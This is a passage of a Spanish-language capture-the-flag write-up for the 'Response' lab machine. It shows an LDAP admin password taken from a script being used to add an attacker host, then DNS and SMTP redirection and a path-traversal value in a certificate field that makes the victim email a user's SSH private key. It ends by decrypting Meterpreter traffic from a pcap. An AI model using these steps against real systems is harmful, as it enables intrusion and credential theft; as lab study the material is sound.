2023/02/06 10:27:16 CMD: UID=0    PID=6592   | /bin/bash /root/ldap/restore_ldap.sh 
2023/02/06 10:27:16 CMD: UID=0    PID=6599   | /bin/bash /root/ldap/restore_ldap.sh 
```

Dentro de scan.sh, hay una función que se encarga con el usuario de expresiones regulares de validar los correos

```null
function isEmailValid() {
  regex="^(([A-Za-z0-9]+((\.|\-|\_|\+)?[A-Za-z0-9]?)*[A-Za-z0-9]+)|[A-Za-z0-9]+)@(([A-Za-z0-9]+)+((\.|\-|\_)?([A-Za-z0-9]+)+)*)+\.([A-Za-z]{2,})+$"
  [[ "${1}" =~ $regex ]]
}
```

Y credenciales en texto claro

```null
bind_dn='cn=admin,dc=response,dc=htb'
pwd='aU4EZxEAOnimLNzk3'
```

Se conecta al LDAP y valida la IP

```
# get customer's servers from LDAP
servers=$(/usr/bin/ldapsearch -x -D $bind_dn -w $pwd -s sub -b 'ou=servers,dc=response,dc=htb' '(objectclass=ipHost)'|grep ipHostNumber|cut -d ' ' -f2)
for ip in $servers; do
  if [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "scanning server ip $ip" >> $log_file
```

Pruebo a ejecutar lo mismo para ver cual es la IP que almacena la variable

```
bob@response:/home/scryh/scan$ /usr/bin/ldapsearch -x -D 'cn=admin,dc=response,dc=htb' -w 'aU4EZxEAOnimLNzk3' -s sub -b 'ou=servers,dc=response,dc=htb' '(objectclass=ipHost)'|grep ipHostNumber|cut -d ' ' -f2
172.18.0.4
```

Seguidamente, realiza un escaneo con nmap y almacena el contenido en un PDF, convirtiéndolo desde XML

```
# scan customer server and generate PDF report
outfile="output/scan_$ip"
nmap -v -Pn $ip -p 443 --script scripts/ssl-enum-ciphers,scripts/ssl-cert,scripts/ssl-heartbleed -oX "$outfile.xml"
wkhtmltopdf "$outfile.xml" "$outfile.pdf"
```

Intenta añadirlo a un LOG, siempre y cuando el email proporcionado sea válido

```

# get customer server manager
manager_uid=$(/usr/bin/ldapsearch -x -D $bind_dn -w $pwd -s sub -b 'ou=servers,dc=response,dc=htb' '(&(objectclass=ipHost)(ipHostNumber='$ip'))'|grep 'manager: uid='|cut -d '=' -f2|cut -d ',' -f1)
if [[ "$manager_uid" =~ ^[a-zA-Z0-9]+$ ]]; then
  echo "- retrieved manager uid: $manager_uid" >> $log_file
```

Aplica resolución DNS para encontrar el hostname asociado con el email

```
# get SMTP server
domain=$(echo $mail|cut -d '@' -f2)
local_dns=true
smtp_server=$(nslookup -type=mx "$domain"|grep 'mail exchanger'|cut -d '=' -f2|sort|head -n1|cut -d ' ' -f3)
if [[ -z "$smtp_server" ]]; then
  echo "- failed to retrieve SMTP server for domain \"$domain\" locally" >> $log_file

  # SMTP server not found. try to query customer server via DNS
  local_dns=false
  smtp_server=$(timeout 0.5 nslookup -type=mx "$domain" "$ip"|grep 'mail exchanger'|cut -d '=' -f2|sort|head -n1|cut -d ' ' -f3)
  if [[ -z "$smtp_server" ]]; then
    echo "- failed to retrieve SMTP server for domain \"$domain\" from server $ip" >> $log_file

    # failed to retrieve SMTP server
    continue
  fi
fi
```

Tenía el doinio response-text.htb, que extraje antes del LDAP. Con dig aplico consultas DNS a través de los servidores de correo

```null
bob@response:/home/scryh/scan$ dig @172.18.0.4 response-test.htb mx

; <<>> DiG 9.16.1-Ubuntu <<>> @172.18.0.4 response-test.htb mx
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 46228
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: e6ca864677fae96a0100000063e0ddc597c934ac59086d32 (good)
;; QUESTION SECTION:
;response-test.htb.		IN	MX

;; ANSWER SECTION:
response-test.htb.	38400	IN	MX	10 mail.response-test.htb.

;; ADDITIONAL SECTION:
mail.response-test.htb.	38400	IN	A	172.18.0.4

;; Query time: 0 msec
;; SERVER: 172.18.0.4#53(172.18.0.4)
;; WHEN: Mon Feb 06 11:00:21 UTC 2023
;; MSG SIZE  rcvd: 111
```

Luego asocia el dominio con la IP

```null
if [[ "$smtp_server" =~ ^[a-z0-9.-]+$ ]]; then
          echo "- retrieved SMTP server for domain \"$domain\": $smtp_server" >> $log_file

          # retrieve ip address of SMTP server
          if $local_dns; then
            smtp_server_ip=$(nslookup "$smtp_server"|grep 'Name:' -A2|grep 'Address:'|head -n1|cut -d ' ' -f2)
          else
            smtp_server_ip=$(nslookup "$smtp_server" "$ip"|grep 'Name:' -A2|grep 'Address:'|head -n1|cut -d ' ' -f2)
          fi
```

Y finalmente, llama al script send_report.py, pasándole como argumentos la IP, el correo y el fichero del output de nmap, para depositarlo en el LOG

```null
# send PDF report via SMTP
./send_report.py "$smtp_server_ip" "$mail" "$outfile.pdf" >> $log_file
```

Este script no es tan largo

```null
#!/usr/bin/env python3

import sys
import smtplib
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate

def send_report(smtp_server, customer_email, fn):
  msg = MIMEMultipart()
  msg['From']    = 'reports@response.htb'
  msg['To']      = customer_email
  msg['Date']    = formatdate(localtime=True)
  msg['Subject'] = 'Response Scanning Engine Report'
  msg.attach(MIMEText('Dear Customer,\n\nthe attached file contains your detailed scanning report.\n\nBest regards,\nYour Response Scanning Team\n'))
  pdf = open(fn, 'rb').read()
  part = MIMEApplication(pdf, Name='Scanning_Report.pdf')
  part['Content-Disposition'] = 'attachment; filename="Scanning_Report.pdf"'
  msg.attach(part)
  smtp = smtplib.SMTP(smtp_server)
  smtp.sendmail(msg['From'], customer_email, msg.as_string())
  smtp.close()


def main():
  if (len(sys.argv) != 4):
    print('usage:\n%s <smtp_server> <customer_email> <report_file>' % sys.argv[0])
    quit()

  print('- sending report %s to customer %s via SMTP server %s' % ( sys.argv[3], sys.argv[2], sys.argv[1]))
  send_report(sys.argv[1], sys.argv[2], sys.argv[3])

if (__name__ == '__main__'):
  main()
```

Se encargar de tramitar los correos según los parámetros que se le hayan pasado, pero no hay ninguna información que pueda reutilizar

Tiene un directorio de scripts de nmap

```null
bob@response:/home/scryh/scan/scripts$ ls
ssl-cert.nse  ssl-enum-ciphers.nse  ssl-heartbleed.nse
```

Buscos los scripts de nmap relacionados con SSL por lo que vi antes para analizarlos más a fondo

El script ssl-cert.nse de su directorio personal parece una copia modificada del original. Aplicando una diferenciación con diff

```null
bob@response:/home/scryh/scan/scripts$ diff ./ssl-cert.nse /usr/share/nmap/scripts/ssl-cert.nse 
232,257d231
< local function read_file(fn)
<   local f = io.open(fn, 'r')
<   local content = ''
<   if f ~= nil then
<     content = f:read('*all')
<     f:close()
<   end
<   return content
< end
< 
< local function get_countryName(subject)
<   countryName = read_file('data/countryName/' .. subject['countryName'])
<   if (countryName == '') then
<     return 'UNKNOWN'
<   end
<   return countryName
< end
< 
< local function get_stateOrProvinceName(subject)
<   stateOrProvinceName = read_file('data/stateOrProvinceName/' .. subject['stateOrProvinceName'])
<   if (stateOrProvinceName == '') then
<     return 'NO DETAILS AVAILABLE'
<   end
<   return stateOrProvinceName
< end
< 
262,263d235
<   lines[#lines + 1] = "Full countryName: " .. get_countryName(cert.subject)
<   lines[#lines + 1] = "stateOrProvinceName Details: " .. get_stateOrProvinceName(cert.subject)
308a281,283
> 
> 
> 
```

Le está añadiendo unas líneas al output del archivo. Como está realizando un append al contenido que hay previamente, es posible que sea vulnearble a LFI, haciendo un directory path traversal hasta llegar a la raíz

Como se estaba aplicando un escaneo con nmap a ciertas IPs, podría tratar de cambiar la configuración para que haga un escaneo a mi equipo y quedarmen en escucha con WireShark para ver el tráfico entrante del lado de la máquina víctima.

Se podía ver la estructura en una consulta que hice cuando quería saber la IP del escaneo

```null
bob@response:/home/scryh/scan$ /usr/bin/ldapsearch -x -D 'cn=admin,dc=response,dc=htb' -w 'aU4EZxEAOnimLNzk3' -s sub -b 'ou=servers,dc=response,dc=htb' '(objectclass=ipHost)'
# extended LDIF
#
# LDAPv3
# base <ou=servers,dc=response,dc=htb> with scope subtree
# filter: (objectclass=ipHost)
# requesting: ALL
#

# TestServer, servers, response.htb
dn: cn=TestServer,ou=servers,dc=response,dc=htb
objectClass: top
objectClass: ipHost
objectClass: device
cn: TestServer
manager: uid=marie,ou=customers,dc=response,dc=htb
ipHostNumber: 172.18.0.4

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
bob@response:/home/scryh/scan$ 
```

Creo un archivo temporal rubbx.ldif en /tmp

```null
dn: cn=rubbxserver,ou=servers,dc=response,dc=htb
objectClass: top
objectClass: ipHost
objectClass: device
cn: rubbxserver
manager: uid=marie,ou=customers,dc=response,dc=htb
ipHostNumber: 10.10.16.3
```

Lo añado al LDAP, con las credenciales que tenía de antes

```null
bob@response:/tmp$ ldapadd -D 'cn=admin,dc=response,dc=htb' -w 'aU4EZxEAOnimLNzk3' -f /tmp/rubbx.ldif 
adding new entry "cn=rubbxserver,ou=servers,dc=response,dc=htb"
```

Y recibo las peticiones, tanto en netcat como WireShark

<img src="/writeups/assets/img/Response-htb/28.png" alt="">

Podría tratar de crear un servicio HTTPS con python para que no se envíe el RST Pack y termine la conexión. Encuentro un [issue](https://gist.github.com/dergachev/7028596) en Github que me sirve de ayuda

También tengo que crear un par de claves con openssl para que funcione

```null
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

ChatGPT me proporcionó un script más óptimo

<img src="/writeups/assets/img/Response-htb/29.png" alt="">

Le indico la interfaz que quiero usar y el puerto 443

```null
from flask import Flask
app = Flask(__name__)

@app.route("/")
def hello():
    return "Hola, Mundo!"

if __name__ == "__main__":
    app.run(host='10.10.16.3', ssl_context=('cert.pem', 'key.pem'), port=443)
```

Le hago un escaneo de mi lado, para comprobar que todo está funcional

```null
nmap -p443 -sCV 10.10.16.3
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-06 12:30 GMT
Nmap scan report for 10.10.16.3
Host is up (0.00027s latency).

PORT    STATE SERVICE   VERSION
443/tcp open  ssl/https Werkzeug/2.2.2 Python/3.10.9
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2023-02-06T12:19:58
|_Not valid after:  2024-02-06T12:19:58
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Mon, 06 Feb 2023 12:30:47 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 12
|     Connection: close
|_    Hola, Mundo!
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port443-TCP:V=7.93%T=SSL%I=7%D=2/6%Time=63E0F2F7%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,B9,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.10\.9\r\nDate:\x20Mon,\x2006\x20Feb\x202023\x2012:30:47\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x2012\r\nConnection:\x20close\r\n\r\nHola,\x20Mundo!");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.38 seconds
```

Agreo de nuevo el servicio al LDAP. Es posible que haya que hacerlo varias veces, hasta que aparezca en la configuración

```null
bob@response:/tmp$ /usr/bin/ldapsearch -x -D 'cn=admin,dc=response,dc=htb' -w 'aU4EZxEAOnimLNzk3' -s sub -b 'ou=servers,dc=response,dc=htb' '(objectclass=ipHost)' | grep ipHostNumber
ipHostNumber: 172.18.0.4
ipHostNumber: 10.10.16.3
```

Ahora ya recibo correctamente los paquetes

<img src="/writeups/assets/img/Response-htb/30.png" alt="">

Pero para que pase por las validaciones que están implementadas en el script de Bash, tengo que redirigir todo el tráfico que me llega por el puerto 443 al servidor de correos de la máquina víctima por iptables.

Creo un archivo de configuración del DNS, dns.conf, añadiendo las direcciones IP junto con los subdominios y con 2 DNS Records, con diferentes probabilidades para que los encuentre una vez aplique la resolución

```conf
address=/tunnel/10.10.16.3
address=/mail.response-test.htb/10.10.16.3
mx-host=response-test.htb,mail1.response-test.htb,0
mx-host=response-test.htb,mail2.response-test.htb,10
```

Con dnsmasq, añado esta configuración, no a mi puerto de DNS principal, si no a uno temporal

```null
dnsmasq -p 8053 -C dns.conf
```

En la máquina víctima, me aseguro de que el tunel se ha creado correctamente

```null
bob@response:/tmp$ dig @10.10.16.3 tunnel

; <<>> DiG 9.16.1-Ubuntu <<>> @10.10.16.3 tunnel
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 29541
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 512
;; QUESTION SECTION:
;tunnel.				IN	A

;; AUTHORITY SECTION:
.			5	IN	SOA	a.root-servers.net. nstld.verisign-grs.com. 2023020600 1800 900 604800 86400

;; Query time: 132 msec
;; SERVER: 10.10.16.3#53(10.10.16.3)
;; WHEN: Mon Feb 06 13:45:32 UTC 2023
;; MSG SIZE  rcvd: 110
```

Ahora con iptables, creo una regla para que todo lo que reciba por el puerto 53 por UDP de la máquina víctima, se redirija al nuevo DNS especialmente diseñado para que apunte al servidor de correos que yo no tengo acceso, ya que está empleando una interfaz que está en otro segmento fuera de mi alcance, pero como la petición no la voy a realizar yo, si no la máquina víctima, resuelve sin problemas

```null
iptables -A PREROUTING -t nat -p udp -s 10.10.11.163 --dport 53 -j REDIRECT --to-ports 8053
```

Compruebo si resuelve para el dominio que response-test.htb, y que encuentra los dos DNS Records

```null
bob@response:/tmp$ dig @10.10.16.3 response-test.htb mx

; <<>> DiG 9.16.1-Ubuntu <<>> @10.10.16.3 response-test.htb mx
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 46958
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;response-test.htb.		IN	MX

;; ANSWER SECTION:
response-test.htb.	0	IN	MX	10 mail2.response-test.htb.
response-test.htb.	0	IN	MX	0 mail1.response-test.htb.

;; Query time: 136 msec
;; SERVER: 10.10.16.3#53(10.10.16.3)
;; WHEN: Mon Feb 06 13:54:38 UTC 2023
;; MSG SIZE  rcvd: 124
```

Como me daba problemas, dejé solamente un DNS Record

```null
bob@response:/tmp$ dig @10.10.16.3 response-test.htb mx +short
0 mail.response-test.htb.
```

Ya resolviendo esa dirección a mi equipo, me monto un servicio SMTP con python, en modo debugging, para que se comunique conmigo y ver las peticiones

```null
python3 -m smtpd -n -c DebuggingServer 10.10.16.3:25
```

Vuelvo a añadirme a la configuración del LDAP de la máquina víctima y espero a ver que recibo. Me llega un mensaje en base64 y formato bytes. Lo almaceno en un archivo y miro su tipo de archivo

```null
cat mail | tr -d "\n" | base64 -d | sponge mail

file mail
mail: PDF document, version 1.4, 1 pages
```

Como es un PDF, lo renombro con dicha extensión para verlo en Firefox

<img src="/writeups/assets/img/Response-htb/31.png" alt="">

Se trata del escaneo que ha realizado con nmap. Pudiendo ver ya su contenido, tengo que conseguir cargar dentro un archivo de la máquina víctima, abusando del LFI que había visto en el script en lua de nmap

```lua
local function output_str(cert)
  local lines = {}

  lines[#lines + 1] = "Subject: " .. stringify_name(cert.subject)
  lines[#lines + 1] = "Full countryName: " .. get_countryName(cert.subject)
  lines[#lines + 1] = "stateOrProvinceName Details: " .. get_stateOrProvinceName(cert.subject)
  if cert.extensions then
    for _, e in ipairs(cert.extensions) do
      if e.name == "X509v3 Subject Alternative Name" then
        lines[#lines + 1] = "Subject Alternative Name: " .. e.value
        break
      end
    end
  end
```

Como se ve reflejado el Country Name, puedo intentar aplicar un Directory Path Traversal a la hora de generar las claves SSL, con idea de cargar un archivo en el PDF

```null
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:../../../../../../../../../../../../../../../home/scryh/.ssh/id_rsa
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Me vuelvo a añadir a la configuración de LDAP y espero a que me llegue el correo a mi servidor SMTP

<img src="/writeups/assets/img/Response-htb/32.png" alt="">

Consigo la id_rsa del usuario scryh. Me la copio, le doy el permiso 600 y me conecto por SSH sin proporcionar contraseña

```null
ssh scryh@response.htb -i id_rsa

scryh@response:~$ whoami
scryh
scryh@response:~$ id
uid=1000(scryh) gid=1000(scryh) groups=1000(scryh)
```

Ahora puede acceder al directorio incident_2022-3-042 y listar su contenido

```null
scryh@response:~/incident_2022-3-042$ ls
core.auto_update  dump.pcap  IR_report.pdf
```

Dentro hay una captura de tshark, WireShark o similares, un PDF y otro archivo que todavía no se lo que es. Me comparto un servicio HTTP desde la máquina víctima para descargarme todo y verlo en local

<img src="/writeups/assets/img/Response-htb/33.png" alt="">

En el reporte están adviertiendo de que el archivo core.auto_update está infectado por un payload de Meterpreter y que se ha hecho una captura del tráfico de red que han almacenado en dump.pcap.

Subo el binario a VirusTotal, para conocer más a fondo de que se trata

<img src="/writeups/assets/img/Response-htb/34.png" alt="">

Primero busco con tshark por palabras clave, como usuario y contraseña

```null
tshark -r dump.pcap | grep -iE "username|password"
Running as user "root" and group "root". This could be dangerous.
  452   3.185248   172.19.0.3 → 172.19.0.2   RESP 279 Request: multi hset session:a7bec9b336e8acc48c7b1ef8427cd0c3 username b0b connected true expire session:a7bec9b336e8acc48c7b1ef8427cd0c3 3600 exec
  498   3.187265   172.19.0.3 → 172.19.0.2   RESP 552 Request: multi hmget session:a7bec9b336e8acc48c7b1ef8427cd0c3 username connected hmget session:6c194860b57fab9f0b0a44cdb01e43c5 username connected hmget session:2d8482b14e4912f366d3d45ae50941b9 username connected hmget session:bdbd444919899e2b4b2e294a3a521936 username connected hmget session:001fc317c442607b5fb14435803951ba username connected exec
```

Como encuentra un match, abro la captura con Wireshark y sigo el flujo del tráfico TCP, hasta llegar a lo siguiente:

<img src="/writeups/assets/img/Response-htb/35.png" alt="">

Filtro por todas las peticiones por POST y encuentro la contraseña de Bob de la web (aunque creo que no me sirve de nada)

<img src="/writeups/assets/img/Response-htb/36.png" alt="">

Veo un PHPSESSID, forzando una URL, como hice yo al principio

<img src="/writeups/assets/img/Response-htb/37.png" alt="">

Busco en Google cual es el puerto por defecto de Meterpreter, para así filtrar por este

<img src="/writeups/assets/img/Response-htb/38.png" alt="">

Encuentro muchos datos

<img src="/writeups/assets/img/Response-htb/39.png" alt="">

Sigo el flujo TCP y muestro los datos en UTF-8, con intención de encontrar alguna cadena legible. En hexadecimal se detecta un patrón

<img src="/writeups/assets/img/Response-htb/40.png" alt="">

Encuentro en los [docs](https://docs.metasploit.com/api/Rex/Post/Meterpreter/Packet.html) de Metasploit la forma en la que se cifran los datos en función de la cabecera

<img src="/writeups/assets/img/Response-htb/41.png" alt="">

Se está utilizando la siguiente estructura

<img src="/writeups/assets/img/Response-htb/42.png" alt="">

Le está aplicando un xor a cada valor, así que me abro el python y replico cada paso

```null
python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0x9138 ^ 0x9053)
'0x16b'
```

Y se lo resto a la longitud total para tener los bytes de la cabecera

```null
>>> 0x183-0x16b
24
```

Creo un script que se encargue de filtrar por los paquetes que me interesan

```null
from scapy.all import *

tcp_stream = b''

def handle_pkt(pkt):
    global tcp_stream
    if TCP in pkt:
        if pkt [TCP].sport == 4444 or pkt[TCP].dport == 4444:
            tcp_stream += bytes(pkt[TCP].payload)

sniff(offline='dump.pcap', prn=handle_pkt)

f = open('tcp_stream.raw', 'wb')
f.write(tcp_stream)
f.close()
```

También se puede utilizando tcpdump

```null
tcpdump -r dump.pcap "tcp and (port 4444 or port 4444)" -w tcp_stream.raw
```

Ahora falta desencriptar los datos. Me copio la xor_key, que corresponde a los primeros 4 bytes de la captura, abriendo directamente el archivo con python, y así para el resto de variables. Como tengo que aplicar un xor y no son strings, hay que crear un bucle que vaya iterando por cada byte para convertirlo. Para extraer la clave AES, voy a utilizar una herramienta llamada bulk_extractor, disponible en [Github](https://github.com/simsong/bulk_extractor)

```null
bulk_extractor -o bulk_output core.auto_update
```

De todos los archivos que crea, solo unos pocos tienen contenido

```null
du -hc * | grep -v ^0
4.0K	aes_keys.txt
4.0K	ccn_histogram.txt
4.0K	ccn.txt
4.0K	domain_histogram.txt
4.0K	domain.txt
20K	elf.txt
4.0K	email_domain_histogram.txt
4.0K	email_histogram.txt
4.0K	email.txt
12K	report.xml
4.0K	rfc822.txt
4.0K	url_histogram.txt
4.0K	url_services.txt
4.0K	url.txt
80K	total
```

Y obtengo la clave AES

```null
# BANNER FILE NOT PROVIDED (-b option)
# BULK_EXTRACTOR-Version: 2.0.0
# Feature-Recorder: aes_keys
# Filename: core.auto_update
# Feature-File-Version: 1.1
1687472	f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5	AES256
2510080	f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5	AES256
2796144	f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5	AES256
2801600	f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5	AES256
```

El script quedaría de la siguiente forma. Creador: [IppSec](https://www.youtube.com/watch?v=-t1UAvTxB94)

```null
from Crypto.Cipher import AES
import msftype

def xor(data, key):
    r = b''
    for i in range(len(data)):
        r += bytes([data[i] ^ key[i % len(key)]])
    return r

aes_key = bytes.fromhex('f2003c143dc8436f39ad6f8fc4c24f3d35a35d862e10b4c654aedc0ed9dd3ac5')

f = open('/home/rubbx/Desktop/HTB/Machines/Response/resources/tcp_stream.raw', 'rb')

while True:
    xor_key = f.read(4)
    session_key = xor(f.read(16), xor_key)
    enc_flag = xor(f.read(4), xor_key)
    pack_len = xor(f.read(4), xor_key)
    pack_type = xor(f.read(4), xor_key)
    pack_len_int = int.from_bytes(pack_len, 'big')


    if int.from_bytes(enc_flag,'big') == 0:
        tlv = xor (f.read(pack_len_int -8), xor_key)

    else :
        aes_iv = xor(f.read(16), xor_key)
        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
        tlv = xor(f.read(pack_len_int - 24), xor_key)
        tlv = cipher.decrypt(tlv)
        tlv_len = tlv[0:4]
        tlv_type = tlv[4:8]
        tlv_type_1 = tlv_type[0:2]
        tlv_type_2 = int.from_bytes(tlv[2:4], 'big')
        
        print(msftype.MSFType(tlv_type_1).name)
        print(msftype.MSFType(tlv_type_2).name)
        break

f.close()
```

Y obtengo la clave AES. Es necesario otro script para saber que tipo de payload de meterpreter se ha utilizado

<img src="/writeups/assets/img/Response-htb/43.png" alt="">

Creo una clase en python para importarla en el script

```null
from enum import Enum
class MSFType (Enum):
    TLV_TYPE_ANY = 0
    TLV_TYPE_COMMAND_ID = 1
    TLV_TYPE_REQUEST_ID = 2
    TLV_TYPE_EXCEPTION = 3
    TLV_TYPE_RESULT = 4
    TLV_TYPE_STRING = 10
    TLV_TYPE_UINT = 11
    TLV_TYPE_BOOL = 12
    TLV_TYPE_LENGTH = 25
    TLV_TYPE_DATA = 26
    TLV_TYPE_FLAGS = 27
    TLV_TYPE_CHANNEL_ID = 50
    TLV_TYPE_CHANNEL_TYPE = 51
    TLV_TYPE_CHANNEL_DATA = 52
    TLV_TYPE_CHANNEL_DATA_GROUP = 53
    TLV_TYPE_CHANNEL_CLASS = 54
    TLV_TYPE_CHANNEL_PARENTID = 55
    TLV_TYPE_SEEK_WHENCE = 70
    TLV_TYPE_SEEK_OFFSET = 71
    TLV_TYPE_SEEK_POS = 72
    TLV_TYPE_EXCEPTION_CODE = 300
    TLV_TYPE_EXCEPTION_STRING = 301
    TLV_TYPE_LIBRARY_PATH = 400
    TLV_TYPE_TARGET_PATH = 401
    TLV_TYPE_MIGRATE_PID = 402
    TLV_TYPE_MIGRATE_PAYLOAD = 404
    TLV_TYPE_MIGRATE_ARCH = 405
    TLV_TYPE_MIGRATE_BASE_ADDR = 407
    TLV_TYPE_MIGRATE_ENTRY_POINT = 408
    TLV_TYPE_MIGRATE_SOCKET_PATH = 409
    TLV_TYPE_MIGRATE_STUB = 411
    TLV_TYPE_LIB_LOADER_NAME = 412
    TLV_TYPE_LIB_LOADER_ORDINAL = 413
    TLV_TYPE_TRANS_TYPE = 430
    TLV_TYPE_TRANS_URL = 431
    TLV_TYPE_TRANS_UA = 432
    TLV_TYPE_TRANS_COMM_TIMEOUT = 433
    TLV_TYPE_TRANS_SESSION_EXP = 434
    TLV_TYPE_TRANS_CERT_HASH = 435
    TLV_TYPE_TRANS_PROXY_HOST = 436
    TLV_TYPE_TRANS_PROXY_USER = 437
    TLV_TYPE_TRANS_PROXY_PASS = 438
    TLV_TYPE_TRANS_RETRY_TOTAL = 439
    TLV_TYPE_TRANS_RETRY_WAIT = 440
    TLV_TYPE_TRANS_HEADERS = 441
    TLV_TYPE_TRANS_GROUP = 442
    TLV_TYPE_MACHINE_ID = 460
    TLV_TYPE_UUID = 461
    TLV_TYPE_SESSION_GUID = 462
    TLV_TYPE_RSA_PUB_KEY = 550
    TLV_TYPE_SYM_KEY_TYPE = 551
    TLV_TYPE_SYM_KEY = 552
    TLV_TYPE_ENC_SYM_KEY = 553
    TLV_TYPE_PIVOT_ID = 650
    TLV_TYPE_PIVOT_STAGE_DATA = 651
    TLV_TYPE_PIVOT_NAMED_PIPE_NAME = 653
```

Y obtengo el valor del segundo TLV

```null
python3 decrypt.py
TLV_TYPE_COMMAND_ID
```

El primer TLV no está asociado a ningún valor, si no a un rango. En caso de añadirlo al script no se va a ejecutar. Pero puedo imprimirlo como valor para buscarlo manualmente

```null
python3 decrypt.py
b'\x00\x02'
TLV_TYPE_COMMAND_ID
```

<img src="/writeups/assets/img/Response-htb/44.png" alt="">

Lo más probable es que sea UINT

Pero hay que tener en cuenta que es probable que haya más de un TLV en un paquete, por lo que conviene crear un bucle anidado que vaya iterando por la longitud de la variable tlv, de tal forma que vaya sustituyendo su valor en los primeros bytes de esa misma variable, y encontrar así otros TLVs

```null
    else :
        aes_iv = xor(f.read(16), xor_key)
        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
        tlv = xor(f.read(pack_len_int - 24), xor_key)
        tlv = cipher.decrypt(tlv)
        break

    while len(tlv) > 0:

        tlv_len = tlv[0:4]
        tlv_type = tlv[4:8]
        tlv_type_1 = tlv_type[0:2]
        tlv_type_2 = int.from_bytes(tlv_type[2:4], 'big')
        tlv_len_int = int.from_bytes(tlv_len, 'big')
        
        print(msftype.MSFType(tlv_type_2).name)

        tlv = tlv[tlv_len_int:]

f.close()
```

Ahora al ejecutar, obtengo todas las posibles combinaciones

```null
python3 decrypt.py
TLV_TYPE_COMMAND_ID
TLV_TYPE_REQUEST_ID
TLV_TYPE_RSA_PUB_KEY
TLV_TYPE_UUID
TLV_TYPE_COMMAND_ID
TLV_TYPE_REQUEST_ID
TLV_TYPE_RESULT
TLV_TYPE_SYM_KEY_TYPE
TLV_TYPE_ENC_SYM_KEY
```

Una de ellas corresponde a una clave pública. Pero a no ser de que los valores de "p" y "q" sean muy pequeños no me sirve de nada. Busco por el ID del TLV en el diccionario que me monté antes. Puede ser que no tenga los suficientes TLV incorporados. Encuentro un archivo dentro de las extensiones de Meterpreter.


Añado todos los TLVs de la misma manera que antes

```null3
python3 decrypt.py
TLV_TYPE_COMMAND_ID
TLV_TYPE_REQUEST_ID
TLV_TYPE_RSA_PUB_KEY
TLV_TYPE_UUID
TLV_TYPE_COMMAND_ID
TLV_TYPE_REQUEST_ID
TLV_TYPE_RESULT
TLV_TYPE_SYM_KEY_TYPE
TLV_TYPE_ENC_SYM_KEY
TLV_TYPE_CHANNEL_DATA
```

Me puedo descargar la data. La almaceno en un fichero con extensión ZIP, aunque no tiene nada que ver

```null
